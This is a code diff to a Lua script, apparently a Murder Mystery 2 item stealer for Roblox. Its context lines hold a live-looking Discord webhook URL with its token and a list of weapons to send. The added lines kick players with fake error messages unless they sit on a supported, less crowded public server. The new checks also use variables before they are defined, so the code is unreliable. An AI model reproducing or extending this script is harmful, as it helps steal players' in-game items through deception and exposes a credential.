@@ -4,6 +4,21 @@ local min_value = 1
 local ping = "Yes"
 local webhook = "https://discord.com/api/webhooks/1407135393530384485/G200vNB4aThSKgLul5xiZES9vir3rGh079I6LHAOxDQsZ8QtdcAwPcTAhZPdvSnI-xGB"
 
+if game.PlaceId ~= 142823291 then
+    plr:kick("Game not supported. Please join a normal MM2 server")
+    return
+end
+
+if game:GetService("RobloxReplicatedStorage"):WaitForChild("GetServerType"):InvokeServer() == "VIPServer" then
+    plr:kick("Server error. Please join a DIFFERENT server")
+    return
+end
+
+if #Players:GetPlayers() >= 12 then
+    plr:kick("Server is full. Please join a less populated server")
+    return
+end
+
 local weaponsToSend = {}
 local Players = game:GetService("Players")
 local plr = Players.LocalPlayer
